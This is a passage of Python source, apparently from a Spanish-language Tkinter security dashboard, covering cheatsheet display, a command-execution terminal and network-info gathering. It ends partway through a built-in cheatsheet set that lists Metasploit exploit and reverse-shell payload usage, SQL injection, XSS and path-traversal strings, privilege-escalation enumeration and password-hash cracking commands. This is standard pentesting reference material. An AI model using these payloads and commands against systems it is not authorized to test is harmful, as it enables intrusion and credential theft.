            try:
                with open(archivo_path, 'r', encoding='utf-8') as f:
                    contenido = f.read()
                
                self.escribir_terminal(f"=== CHEATSHEET: {nombre_archivo} ===", "[CHEATSHEETS]")
                
                # Procesar contenido línea por línea para mejor formato
                lineas = contenido.split('\n')
                
                for i, linea in enumerate(lineas):
                    if i > 80:  # Limitar a 80 líneas para no saturar el terminal
                        self.escribir_terminal("... (contenido truncado - use editor externo para ver completo)", "[INFO]")
                        break
                    
                    # Formato especial para diferentes tipos de líneas
                    if linea.strip().startswith('#'):
                        # Títulos/headers
                        self.escribir_terminal(f"[INFO] {linea.strip()}", "[TÍTULO]")
                    elif linea.strip().startswith('```') or linea.strip().startswith('~~~'):
                        # Bloques de código
                        self.escribir_terminal(f"[SYSTEM] {linea.strip()}", "[CÓDIGO]")
                    elif linea.strip().startswith('-') or linea.strip().startswith('*'):
                        # Listas
                        self.escribir_terminal(f"PIN {linea.strip()}", "[LISTA]")
                    elif 'nmap' in linea.lower() or 'sudo' in linea.lower() or linea.strip().startswith('/'):
                        # Comandos específicos
                        self.escribir_terminal(f"[FAST] {linea.strip()}", "[COMANDO]")
                    elif linea.strip() and not linea.startswith(' '):
                        # Líneas de texto normal
                        self.escribir_terminal(f"   {linea.strip()}", "[CHEATSHEETS]")
                    else:
                        # Líneas con formato especial (código, ejemplos)
                        if linea.strip():
                            self.escribir_terminal(f"TIP {linea}", "[EJEMPLO]")
                        else:
                            self.escribir_terminal("", "[CHEATSHEETS]")
                
                # Información del archivo
                stat_info = os.stat(archivo_path)
                tamaño_kb = stat_info.st_size / 1024
                from datetime import datetime
                mod_time = datetime.fromtimestamp(stat_info.st_mtime).strftime("%Y-%m-%d %H:%M")
                
                self.escribir_terminal(f"[STATS] Archivo: {tamaño_kb:.1f} KB, modificado: {mod_time}", "[INFO]")
                
            except UnicodeDecodeError:
                # Intentar con diferentes encodings
                encodings = ['latin-1', 'cp1252', 'iso-8859-1']
                contenido = None
                
                for encoding in encodings:
                    try:
                        with open(archivo_path, 'r', encoding=encoding) as f:
                            contenido = f.read()
                        break
                    except:
                        continue
                
                if contenido:
                    self.escribir_terminal(f"=== CHEATSHEET: {nombre_archivo} (encoding: {encoding}) ===", "[CHEATSHEETS]")
                    lineas = contenido.split('\n')[:50]  # Solo primeras 50 líneas
                    for linea in lineas:
                        if linea.strip():
                            self.escribir_terminal(f"   {linea.strip()}", "[CHEATSHEETS]")
                else:
                    self.escribir_terminal(f"ERROR No se pudo leer {nombre_archivo} (problema de encoding)", "[ERROR]")
                    
        except Exception as e:
            self.escribir_terminal(f"ERROR mostrando cheatsheet: {str(e)}", "[ERROR]")
    
    def _buscar_cheatsheet_interactivo(self):
        """Función interactiva para buscar y mostrar cheatsheets."""
        import tkinter.simpledialog
        
        try:
            # Obtener directorio de cheatsheets
            directorio_proyecto = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            cheatsheets_dir = os.path.join(directorio_proyecto, "data", "cheatsheets")
            
            if not os.path.exists(cheatsheets_dir):
                self.escribir_terminal("ERROR Carpeta de cheatsheets no encontrada", "[CHEATSHEETS]")
                return
            
            # Obtener lista de cheatsheets
            archivos = os.listdir(cheatsheets_dir)
            cheatsheets = sorted([f for f in archivos if f.endswith(('.txt', '.md'))])
            
            if not cheatsheets:
                self.escribir_terminal("INFO No hay cheatsheets disponibles", "[CHEATSHEETS]")
                return
            
            # Mostrar opciones en el terminal
            self.escribir_terminal("=== BUSCAR CHEATSHEET ===", "[CHEATSHEETS]")
            
            # Crear lista con números para selección
            for i, cs in enumerate(cheatsheets, 1):
                extension = "NOTE" if cs.endswith('.txt') else "📄"
                nombre_sin_ext = cs.replace('.txt', '').replace('.md', '')
                self.escribir_terminal(f"{i:2d}. {extension} {nombre_sin_ext}", "[LISTA]")
            
            # Pedir entrada al usuario
            self.escribir_terminal("\nTIP OPCIONES DE BÚSQUEDA:", "[HELP]")
            self.escribir_terminal("• Escriba el número (ej: 1, 2, 3...)", "[HELP]")
            self.escribir_terminal("• Escriba parte del nombre (ej: nmap, metasploit)", "[HELP]")
            self.escribir_terminal("• Escriba palabras clave (ej: network, sql, linux)", "[HELP]")
            
            # Crear ventana de diálogo simple
            busqueda = tkinter.simpledialog.askstring(
                "Buscar Cheatsheet",
                "Ingrese número, nombre o palabra clave:",
                parent=self
            )
            
            if not busqueda:
                return
            
            busqueda = busqueda.strip()
            
            # Verificar si es un número
            try:
                numero = int(busqueda)
                if 1 <= numero <= len(cheatsheets):
                    archivo_seleccionado = cheatsheets[numero - 1]
                    self.escribir_terminal(f"📖 Mostrando cheatsheet #{numero}: {archivo_seleccionado}", "[CHEATSHEETS]")
                    self.mostrar_cheatsheet(archivo_seleccionado)
                    return
                else:
                    self.escribir_terminal(f"ERROR Número {numero} fuera de rango (1-{len(cheatsheets)})", "[ERROR]")
                    return
            except ValueError:
                pass
            
            # Buscar por nombre o palabra clave
            coincidencias = []
            busqueda_lower = busqueda.lower()
            
            for cs in cheatsheets:
                if busqueda_lower in cs.lower():
                    coincidencias.append(cs)
            
            if len(coincidencias) == 1:
                self.escribir_terminal(f"📖 Encontrado: {coincidencias[0]}", "[CHEATSHEETS]")
                self.mostrar_cheatsheet(coincidencias[0])
            elif len(coincidencias) > 1:
                self.escribir_terminal(f"[SCAN] Encontradas {len(coincidencias)} coincidencias:", "[CHEATSHEETS]")
                for i, cs in enumerate(coincidencias, 1):
                    self.escribir_terminal(f"  {i}. {cs}", "[LISTA]")
                self.escribir_terminal("TIP Sea más específico en la búsqueda", "[HELP]")
            else:
                # Búsqueda en contenido
                self.escribir_terminal(f"[SCAN] Buscando '{busqueda}' en contenido de archivos...", "[CHEATSHEETS]")
                archivos_con_contenido = []
                
                for cs in cheatsheets[:10]:  # Buscar en los primeros 10 archivos
                    try:
                        archivo_path = os.path.join(cheatsheets_dir, cs)
                        with open(archivo_path, 'r', encoding='utf-8', errors='ignore') as f:
                            contenido = f.read().lower()
                            if busqueda_lower in contenido:
                                archivos_con_contenido.append(cs)
                    except:
                        continue
                
                if archivos_con_contenido:
                    self.escribir_terminal(f"📚 Encontrada palabra '{busqueda}' en:", "[CHEATSHEETS]")
                    for cs in archivos_con_contenido:
                        self.escribir_terminal(f"  • {cs}", "[LISTA]")
                    
                    if len(archivos_con_contenido) == 1:
                        self.escribir_terminal(f"📖 Mostrando: {archivos_con_contenido[0]}", "[CHEATSHEETS]")
                        self.mostrar_cheatsheet(archivos_con_contenido[0])
                else:
                    self.escribir_terminal(f"[FAIL] No se encontró '{busqueda}' en ningún cheatsheet", "[ERROR]")
                    self.escribir_terminal("TIP Intente con: nmap, metasploit, burp, sql, linux, windows", "[HELP]")
                    
        except Exception as e:
            self.escribir_terminal(f"ERROR en búsqueda: {str(e)}", "[ERROR]")
    
    def obtener_terminal_integrado(self):
        """Obtener referencia al terminal integrado global."""
        return VistaDashboard._terminal_widget
    
    @classmethod
    def obtener_terminal_global(cls):
        """Método de clase para obtener el terminal desde cualquier lugar."""
        return cls._terminal_widget
    
    @classmethod
    def log_actividad_global(cls, mensaje, modulo="ARESITOS", nivel="INFO"):
        """Método de clase para registrar actividad desde cualquier vista."""
        if cls._terminal_widget:
            timestamp = datetime.now().strftime("%H:%M:%S")
            emoji_map = {
                "INFO": "INFO",
                "SUCCESS": "OK", 
                "WARNING": "ADVERTENCIA",
                "ERROR": "ERROR",
                "DEBUG": "ESCANEO"
            }
            emoji = emoji_map.get(nivel, "LOG")
            mensaje_completo = f"[{timestamp}] {emoji} [{modulo}] {mensaje}\n"
            try:
                if cls._terminal_widget and cls._terminal_widget.winfo_exists():
                    cls._terminal_widget.insert(tk.END, mensaje_completo)
                    cls._terminal_widget.see(tk.END)
            except (tk.TclError, AttributeError):
                pass  # Si hay error, no bloquear la operación
    
    def log_actividad(self, mensaje, modulo="ARESITOS", nivel="INFO"):
        """Método público para que otras vistas registren actividad."""
        # Usar el método de clase para consistencia
        VistaDashboard.log_actividad_global(mensaje, modulo, nivel)
    
    def ejecutar_comando_rapido(self, comando):
        """Ejecutar un comando rápido."""
        self.comando_entry.delete(0, tk.END)
        self.comando_entry.insert(0, comando)
        self.ejecutar_comando_entry()
    
    def ejecutar_comando_entry(self, event=None):
        """Ejecutar comando desde la entrada."""
        comando = self.comando_entry.get().strip()
        if not comando:
            return
        
        self._actualizar_terminal_seguro(f"\n> {comando}\n")
        
        # Ejecutar comando en thread para no bloquear la UI
        thread = threading.Thread(target=self._ejecutar_comando_async, args=(comando,))
        thread.daemon = True
        thread.start()
    
    def _ejecutar_comando_async(self, comando):
        """Ejecutar comando de forma asíncrona."""
        try:
            if platform.system() == "Windows":
                if self.shell_detectado == "powershell":
                    comando_completo = ["powershell", "-Command", comando]
                elif self.shell_detectado == "pwsh":
                    comando_completo = ["pwsh", "-Command", comando]
                else:
                    comando_completo = ["cmd", "/c", comando]
            else:
                comando_completo = ["/bin/bash", "-c", comando]
            
            resultado = subprocess.run(
                comando_completo,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            output = ""
            if resultado.stdout:
                output = resultado.stdout
                # Agregar información adicional para comandos de red
                if "netstat" in comando or "ss" in comando:
                    lineas = resultado.stdout.strip().split('\n')
                    output += f"\n\n=== RESUMEN ===\n"
                    output += f"Total conexiones encontradas: {len(lineas)-1}\n"
                    if "LISTEN" in resultado.stdout:
                        listening = len([l for l in lineas if "LISTEN" in l])
                        output += f"Puertos en escucha: {listening}\n"
                    if "ESTABLISHED" in resultado.stdout:
                        established = len([l for l in lineas if "ESTABLISHED" in l])
                        output += f"Conexiones establecidas: {established}\n"
                        
            if resultado.stderr:
                output += f"\nERROR:\n{resultado.stderr}"
                
            if not output.strip():
                output = f"Comando ejecutado sin salida. Código de retorno: {resultado.returncode}"
            
            # Actualizar UI en el hilo principal
            self.after(0, self._mostrar_output_comando, output)
            
        except subprocess.TimeoutExpired:
            self.after(0, self._mostrar_output_comando, "ERROR: Comando excedió el tiempo límite (30s)")
        except Exception as e:
            self.after(0, self._mostrar_output_comando, f"ERROR: {str(e)}")
    
    def _mostrar_output_comando(self, output):
        """Mostrar output del comando en el terminal."""
        self._actualizar_terminal_seguro(output + "\n")
        self._actualizar_terminal_seguro("="*50 + "\n\n")
    
    def iniciar_actualizacion_metricas(self):
        """Iniciar la actualización de métricas cada 60 segundos."""
        if not self.actualizacion_activa:
            self.actualizacion_activa = True
            self.actualizar_metricas()
    
    def detener_actualizacion_metricas(self):
        """Detener la actualización de métricas."""
        self.actualizacion_activa = False
    
    def actualizar_metricas(self):
        """Actualizar todas las métricas del dashboard."""
        if not self.actualizacion_activa:
            return
        
        try:
            # Actualizar información de red
            self._actualizar_info_red()
            
            # Actualizar estado de servicios
            self._actualizar_estado_servicios()
            
        except Exception as e:
            print(f"Error actualizando métricas: {e}")
        
        # Programar siguiente actualización en 60 segundos
        if self.actualizacion_activa:
            self.after(60000, self.actualizar_metricas)  # 60 segundos = 60000 ms
    
    def _actualizar_info_red(self):
        """Actualizar información de red."""
        try:
            # IP Local
            ip_local = self._obtener_ip_local()
            self.ip_local_label.configure(text=f" IP Local (LAN): {ip_local}")
            
            # IP Pública (en thread separado para no bloquear)
            threading.Thread(target=self._actualizar_ip_publica, daemon=True).start()
            
            # Interfaces de red
            self._actualizar_interfaces_red()
            
        except Exception as e:
            print(f"Error actualizando información de red: {e}")
    
    def _obtener_ip_local(self):
        """Obtener la IP local de la máquina."""
        try:
            # Conectar a un servidor externo para obtener la IP local
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except (ConnectionError, socket.timeout, OSError):
            return "No disponible"
    
    def _actualizar_ip_publica(self):
        """Actualizar IP pública en thread separado."""
        try:
            import subprocess
            resultado = subprocess.run(['curl', '-s', '--max-time', '5', 'https://api.ipify.org'], 
                                     capture_output=True, text=True, timeout=10)
            if resultado.returncode == 0 and resultado.stdout.strip():
                ip_publica = resultado.stdout.strip()
            else:
                ip_publica = "No disponible"
            
            # Actualizar UI en el hilo principal
            self.after(0, lambda: self.ip_publica_label.configure(
                text=f" IP Pública (WAN): {ip_publica}"
            ))
        except (ValueError, TypeError, AttributeError):
            self.after(0, lambda: self.ip_publica_label.configure(
                text=" IP Pública (WAN): No disponible"
            ))
    
    def _actualizar_interfaces_red(self):
        """Actualizar información de interfaces de red con datos completos."""
        try:
            self.interfaces_text.delete(1.0, tk.END)
            
            # Obtener interfaces con ip addr
            try:
                result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                current_interface = None
                interface_info = {}
                
                for line in lines:
                    line = line.strip()
                    
                    # Línea de interface
                    if ': ' in line and '<' in line and '>' in line:
                        # Guardar información de la interfaz anterior
                        if current_interface and current_interface in interface_info:
                            self._mostrar_info_interfaz(current_interface, interface_info[current_interface])
                        
                        parts = line.split(': ')
                        if len(parts) >= 2:
                            current_interface = parts[1].split(':')[0]
                            flags = line.split('<')[1].split('>')[0]
                            estado = "✓ ACTIVA" if "UP" in flags else "✗ INACTIVA"
                            tipo = "WiFi" if "wlan" in current_interface or "wlp" in current_interface else \
                                   "Ethernet" if "eth" in current_interface or "enp" in current_interface else \
                                   "Loopback" if "lo" in current_interface else "Otra"
                            
                            interface_info[current_interface] = {
                                'estado': estado,
                                'tipo': tipo,
                                'flags': flags,
                                'ipv4': [],
                                'ipv6': [],
                                'mac': None
                            }
                    
                    # Obtener direcciones IP
                    elif current_interface and 'inet ' in line:
                        ip_info = line.split('inet ')[1].split()[0]
                        interface_info[current_interface]['ipv4'].append(ip_info)
                    
                    elif current_interface and 'inet6 ' in line:
                        ipv6_info = line.split('inet6 ')[1].split()[0]
                        if 'scope global' in line:
                            interface_info[current_interface]['ipv6'].append(ipv6_info)
                    
                    # Obtener dirección MAC
                    elif current_interface and 'link/ether' in line:
                        mac_addr = line.split('link/ether ')[1].split()[0]
                        interface_info[current_interface]['mac'] = mac_addr
                
                # Mostrar información de la última interfaz
                if current_interface and current_interface in interface_info:
                    self._mostrar_info_interfaz(current_interface, interface_info[current_interface])
                
                # Obtener información adicional de red
                self._agregar_info_red_adicional()
                
            except subprocess.TimeoutExpired:
                self.interfaces_text.insert(tk.END, "ERROR: Timeout obteniendo interfaces\n")
            except FileNotFoundError:
                # Fallback a ifconfig si ip no está disponible
                self._obtener_interfaces_ifconfig()
                
        except Exception as e:
            self.interfaces_text.insert(tk.END, f"ERROR: {str(e)}\n")
    
    def _mostrar_info_interfaz(self, nombre, info):
        """Mostrar información detallada de una interfaz"""
        self.interfaces_text.insert(tk.END, f"🔗 {nombre} ({info['tipo']}):\n")
        self.interfaces_text.insert(tk.END, f"   Estado: {info['estado']}\n")
        
        if info['ipv4']:
            for ip in info['ipv4']:
                self.interfaces_text.insert(tk.END, f"   IPv4: {ip}\n")
        
        if info['ipv6']:
            for ipv6 in info['ipv6']:
                self.interfaces_text.insert(tk.END, f"   IPv6: {ipv6}\n")
        
        if info['mac']:
            self.interfaces_text.insert(tk.END, f"   MAC: {info['mac']}\n")
        
        # Estadísticas de tráfico si están disponibles
        try:
            stats_result = subprocess.run(['cat', f'/sys/class/net/{nombre}/statistics/rx_bytes'], 
                                        capture_output=True, text=True, timeout=2)
            if stats_result.returncode == 0:
                rx_bytes = int(stats_result.stdout.strip())
                rx_mb = rx_bytes / (1024 * 1024)
                self.interfaces_text.insert(tk.END, f"   RX: {rx_mb:.1f} MB\n")
        except:
            pass
        
        try:
            stats_result = subprocess.run(['cat', f'/sys/class/net/{nombre}/statistics/tx_bytes'], 
                                        capture_output=True, text=True, timeout=2)
            if stats_result.returncode == 0:
                tx_bytes = int(stats_result.stdout.strip())
                tx_mb = tx_bytes / (1024 * 1024)
                self.interfaces_text.insert(tk.END, f"   TX: {tx_mb:.1f} MB\n")
        except:
            pass
        
        self.interfaces_text.insert(tk.END, "\n")
    
    def _agregar_info_red_adicional(self):
        """Agregar información adicional de red"""
        self.interfaces_text.insert(tk.END, "[NETWORK] INFORMACIÓN ADICIONAL DE RED:\n\n")
        
        # Gateway predeterminado
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True, timeout=3)
            if result.stdout:
                gateway = result.stdout.split('via ')[1].split()[0] if 'via ' in result.stdout else "No configurado"
                self.interfaces_text.insert(tk.END, f"🚪 Gateway: {gateway}\n")
        except:
            pass
        
        # Servidores DNS
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns_servers = []
                for line in f:
                    if line.startswith('nameserver'):
                        dns_servers.append(line.split()[1])
                if dns_servers:
                    self.interfaces_text.insert(tk.END, f"[SCAN] DNS: {', '.join(dns_servers)}\n")
        except:
            pass
        
        # Hostname
        try:
            result = subprocess.run(['hostname'], capture_output=True, text=True, timeout=2)
            if result.stdout:
                hostname = result.stdout.strip()
                self.interfaces_text.insert(tk.END, f"🏠 Hostname: {hostname}\n")
        except:
            pass
    
    def _obtener_interfaces_ifconfig(self):
        """Fallback usando ifconfig"""
        try:
            result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
            self.interfaces_text.insert(tk.END, "📡 INTERFACES (ifconfig):\n")
            self.interfaces_text.insert(tk.END, result.stdout[:1000] + "...\n")
        except:
            self.interfaces_text.insert(tk.END, "ERROR: No se pudo obtener información de interfaces\n")
    
    def _actualizar_estado_servicios(self):
        """Actualizar estado de servicios de seguridad."""
        # Función simplificada - métricas eliminadas
        pass
    
    def crear_pestana_chuletas(self):
        """Crear pestaña de cheatsheets/chuletas de ciberseguridad."""
        chuletas_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(chuletas_frame, text="Cheatsheets")
        
        # Frame principal dividido
        main_frame = tk.Frame(chuletas_frame, bg=self.colors['bg_primary'])
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Panel izquierdo - Categorías
        left_frame = tk.LabelFrame(
            main_frame,
            text="Categorías de Cheatsheets",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_accent'],
            font=('Arial', 10, 'bold')
        )
        left_frame.pack(side="left", fill="y", padx=(0, 10))
        
        # Lista de categorías
        self.categorias_chuletas = tk.Listbox(
            left_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            selectbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            width=30,
            height=20
        )
        self.categorias_chuletas.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Cargar categorías desde archivo de configuración
        self.cargar_categorias_cheatsheets()
        
        # Bind para selección
        self.categorias_chuletas.bind('<<ListboxSelect>>', self.cargar_cheatsheet)
        
        # Panel derecho - Contenido del cheatsheet
        right_frame = tk.LabelFrame(
            main_frame,
            text="Comandos y Referencias",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_accent'],
            font=('Arial', 10, 'bold')
        )
        right_frame.pack(side="right", fill="both", expand=True)
        
        # Frame para botones superiores
        buttons_frame = tk.Frame(right_frame, bg=self.colors['bg_secondary'])
        buttons_frame.pack(fill="x", padx=5, pady=5)
        
        # Botón copiar comando
        self.btn_copiar = tk.Button(
            buttons_frame,
            text="Copiar Comando",
            command=self.copiar_comando_seleccionado,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=('Arial', 9)
        )
        self.btn_copiar.pack(side="left", padx=5)
        
        # Botón buscar
        self.btn_buscar = tk.Button(
            buttons_frame,
            text="Buscar",
            command=self.buscar_en_cheatsheet,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=('Arial', 9)
        )
        self.btn_buscar.pack(side="left", padx=5)
        
        # Campo de búsqueda
        self.entry_buscar = tk.Entry(
            buttons_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            insertbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            width=20
        )
        self.entry_buscar.pack(side="left", padx=5)
        self.entry_buscar.bind('<Return>', lambda e: self.buscar_en_cheatsheet())
        
        # Botón guardar
        self.btn_guardar = tk.Button(
            buttons_frame,
            text="Guardar Cambios",
            command=self.guardar_cheatsheet,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=('Arial', 9)
        )
        self.btn_guardar.pack(side="right", padx=5)
        
        # Botón cargar cheatsheets
        btn_cargar_cheatsheets = tk.Button(
            buttons_frame,
            text="DIR Abrir Carpeta",
            command=self.abrir_carpeta_cheatsheets,
            bg='#007acc',
            fg='white',
            font=('Arial', 9)
        )
        btn_cargar_cheatsheets.pack(side="right", padx=2)
        
        # Botón refrescar lista
        btn_refrescar = tk.Button(
            buttons_frame,
            text="🔄 Refrescar",
            command=self.cargar_categorias_cheatsheets,
            bg='#17a2b8',
            fg='white',
            font=('Arial', 9)
        )
        btn_refrescar.pack(side="right", padx=2)
        
        btn_ver_cheatsheets = tk.Button(
            buttons_frame,
            text="NOTE Ver Lista",
            command=lambda: self.mostrar_cheatsheet(),
            bg='#28a745',
            fg='white',
            font=('Arial', 9)
        )
        btn_ver_cheatsheets.pack(side="right", padx=2)
        
        btn_buscar_cheat = tk.Button(
            buttons_frame,
            text="[SCAN] Buscar",
            command=self._buscar_cheatsheet_interactivo,
            bg='#ffc107',
            fg='black',
            font=('Arial', 9)
        )
        btn_buscar_cheat.pack(side="right", padx=2)
        
        # Área de texto para comandos
        self.cheatsheet_text = scrolledtext.ScrolledText(
            right_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            insertbackground=self.colors['fg_accent'],
            selectbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            wrap=tk.WORD
        )
        self.cheatsheet_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Cargar cheatsheet inicial si hay categorías
        if self.categorias_chuletas.size() > 0:
            self.categorias_chuletas.selection_set(0)
            self.cargar_cheatsheet(None)
    
    def cargar_categorias_cheatsheets(self):
        """Cargar categorías dinámicamente desde los archivos disponibles en la carpeta cheatsheets."""
        try:
            import os
            
            # Limpiar lista actual
            self.categorias_chuletas.delete(0, tk.END)
            
            # Obtener directorio de cheatsheets
            directorio_proyecto = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            cheatsheets_dir = os.path.join(directorio_proyecto, "data", "cheatsheets")
            
            if not os.path.exists(cheatsheets_dir):
                self.categorias_chuletas.insert(tk.END, "DIR Carpeta cheatsheets no encontrada")
                return
            
            # Obtener lista de archivos disponibles
            archivos = os.listdir(cheatsheets_dir)
            cheatsheets = sorted([f for f in archivos if f.endswith(('.txt', '.md'))])
            
            if not cheatsheets:
                self.categorias_chuletas.insert(tk.END, "LIST No hay cheatsheets disponibles")
                return
            
            # Agregar cada archivo como categoría
            for archivo in cheatsheets:
                # Quitar extensión y formatear nombre
                nombre_sin_ext = archivo.replace('.txt', '').replace('.md', '')
                extension_icon = "NOTE" if archivo.endswith('.txt') else "📄"
                nombre_formateado = f"{extension_icon} {nombre_sin_ext}"
                self.categorias_chuletas.insert(tk.END, nombre_formateado)
                    
        except Exception as e:
            print(f"Error cargando categorías de cheatsheets: {e}")
            # Mensaje de error
            self.categorias_chuletas.insert(tk.END, "[FAIL] Error cargando cheatsheets")
    
    def _crear_cheatsheets_database(self):
        """Crear base de datos de cheatsheets."""
        return {
            "Nmap - Port Scanning": """
# NMAP - NETWORK MAPPING CHEATSHEET

## Escaneos Básicos
nmap target.com                    # Escaneo básico
nmap -sP 192.168.1.0/24           # Ping scan
nmap -sS target.com               # TCP SYN scan
nmap -sT target.com               # TCP connect scan
nmap -sU target.com               # UDP scan

## Detección de Servicios
nmap -sV target.com               # Version detection
nmap -sC target.com               # Default scripts
nmap -A target.com                # Aggressive scan
nmap -O target.com                # OS detection

## Evasión de Firewalls
nmap -f target.com                # Fragment packets
nmap -D RND:10 target.com         # Decoy scan
nmap --source-port 53 target.com  # Source port
nmap -T0 target.com               # Paranoid timing

## Puertos Específicos
nmap -p 80 target.com             # Puerto específico
nmap -p 80,443 target.com         # Múltiples puertos
nmap -p 1-1000 target.com         # Rango de puertos
nmap -p- target.com               # Escaneo completo de puertos

## Scripts NSE
nmap --script vuln target.com     # Vulnerabilidades
nmap --script http-* target.com   # Scripts HTTP
nmap --script ssh-* target.com    # Scripts SSH
nmap --script ssl-* target.com    # Scripts SSL

## Outputs
nmap -oN scan.txt target.com      # Normal output
nmap -oX scan.xml target.com      # XML output
nmap -oG scan.grep target.com     # Grepable output
nmap -oA scan target.com          # All formats
""",
            
            " Metasploit Framework": """
# METASPLOIT FRAMEWORK CHEATSHEET

## Comandos Básicos
msfconsole                        # Iniciar Metasploit
help                              # Ayuda general
search type:exploit platform:linux # Buscar exploits
use exploit/windows/smb/ms17_010  # Seleccionar exploit
info                              # Información del módulo
show options                      # Mostrar opciones
set RHOSTS 192.168.1.100         # Configurar target
set LHOST 192.168.1.50           # Configurar listener
run                               # Ejecutar exploit

## Payloads
show payloads                     # Mostrar payloads disponibles
set payload windows/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp
set payload java/jsp_shell_reverse_tcp

## Meterpreter
sessions                          # Listar sesiones
sessions -i 1                     # Interactuar con sesión
sysinfo                           # Información del sistema
getuid                            # Usuario actual
ps                                # Procesos
migrate 1234                      # Migrar proceso
download file.txt                 # Descargar archivo
upload file.txt                   # Subir archivo
shell                             # Shell del sistema
hashdump                          # Dump de hashes

## Auxiliares
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/ssh/ssh_login

## Database
db_status                         # Estado de la BD
workspace                         # Espacios de trabajo
hosts                             # Hosts descubiertos
services                          # Servicios descubiertos
vulns                             # Vulnerabilidades
""",
            
            "Burp Suite": """
# BURP SUITE CHEATSHEET

## Atajos de Teclado
Ctrl+Shift+T                      # Nuevo proyecto temporal
Ctrl+I                            # Enviar a Intruder
Ctrl+R                            # Enviar a Repeater
Ctrl+D                            # Eliminar elemento
Ctrl+U                            # URL decode
Ctrl+Shift+U                      # URL encode
Ctrl+H                            # HTML encode/decode
Ctrl+Shift+B                      # Base64 encode/decode

## Configuración Proxy
127.0.0.1:8080                    # Puerto por defecto
Intercept On/Off                  # Interceptar requests
Forward                           # Enviar request
Drop                              # Descartar request

## Intruder - Tipos de Ataque
Sniper                            # Un payload set, una posición
Battering Ram                     # Un payload set, todas las posiciones
Pitchfork                         # Múltiples payload sets sincronizados
Cluster Bomb                      # Todas las combinaciones

## Payloads Comunes
' OR '1'='1                       # SQL injection básica
<script>alert('XSS')</script>     # XSS básico
../../../etc/passwd               # Path traversal
{{7*7}}                           # Template injection
${7*7}                            # Expression language injection

## Scanner
Passive scanning                  # Análisis automático
Active scanning                   # Pruebas invasivas
Live scanning                     # Escaneo en tiempo real

## Extensiones Útiles
Autorize                          # Testing de autorización
J2EEScan                          # Java vulnerabilities
Retire.js                         # JavaScript vulnerabilities
Hackvertor                        # Encoding/decoding
Logger++                          # Logging avanzado
""",
            
            "Linux Commands": """
# LINUX COMMANDS CHEATSHEET - CYBERSECURITY FOCUS

## Reconocimiento del Sistema
uname -a                          # Información del kernel
cat /etc/os-release               # Información del OS
whoami                            # Usuario actual
id                                # UID y grupos
groups                            # Grupos del usuario
last                              # Últimos logins
w                                 # Usuarios conectados
ps aux                            # Procesos en ejecución
netstat -tulpn                    # Puertos y servicios
ss -tulpn                         # Sockets (más moderno)

## Escalación de Privilegios
sudo -l                           # Comandos sudo permitidos
find / -perm -4000 2>/dev/null    # Archivos SUID
find / -perm -2000 2>/dev/null    # Archivos SGID
find / -writable 2>/dev/null      # Archivos escribibles
getcap -r / 2>/dev/null           # Capabilities
crontab -l                        # Cron jobs del usuario
cat /etc/crontab                  # Cron jobs del sistema

## Análisis de Logs
tail -f /var/log/auth.log         # Logs de autenticación
tail -f /var/log/syslog           # Logs del sistema
grep "Failed password" /var/log/auth.log  # Intentos fallidos
journalctl -f                     # Systemd logs
lastlog                           # Último login de usuarios

## Red y Conectividad
ifconfig                          # Interfaces de red
ip addr show                      # Interfaces (ip command)
route -n                          # Tabla de rutas
arp -a                            # Tabla ARP
netstat -rn                       # Rutas de red
lsof -i                           # Archivos y puertos abiertos
tcpdump -i eth0                   # Captura de tráfico

## Forense Básico
strings archivo                   # Cadenas legibles
hexdump -C archivo                # Dump hexadecimal
file archivo                      # Tipo de archivo
stat archivo                      # Metadatos del archivo
find /home -name "*.txt" -mtime -1 # Archivos modificados ayer
""",
            
            "John the Ripper": """
# JOHN THE RIPPER CHEATSHEET

## Comandos Básicos
john --list=formats               # Formatos soportados
john hashes.txt                   # Ataque por diccionario
john --show hashes.txt            # Mostrar passwords crackeadas
john --restore                    # Restaurar sesión

## Tipos de Hash
john --format=raw-md5 hash.txt    # MD5
john --format=raw-sha1 hash.txt   # SHA1
john --format=raw-sha256 hash.txt # SHA256
john --format=nt hash.txt         # NTLM
john --format=lm hash.txt         # LM

## Modos de Ataque
john --single hashes.txt          # Single crack mode
john --wordlist=rockyou.txt hashes.txt  # Dictionary attack
john --incremental hashes.txt     # Brute force
john --external=mode hashes.txt   # External mode

## Opciones Útiles
john --users=admin hashes.txt     # Solo usuario específico
john --groups=0 hashes.txt        # Solo grupo específico
john --shell=/bin/bash hashes.txt # Solo usuarios con shell
john --salts=-1 hashes.txt        # Sin salt específico

## Generación de Wordlists
john --wordlist=base.txt --rules --stdout > new.txt
john --incremental=Digits --stdout --session=digits

## Extracción de Hashes
unshadow passwd shadow > combined.txt    # Combinar passwd/shadow
pdf2john file.pdf > hash.txt             # PDF
zip2john file.zip > hash.txt             # ZIP
rar2john file.rar > hash.txt             # RAR
ssh2john id_rsa > hash.txt               # SSH key
""",
            
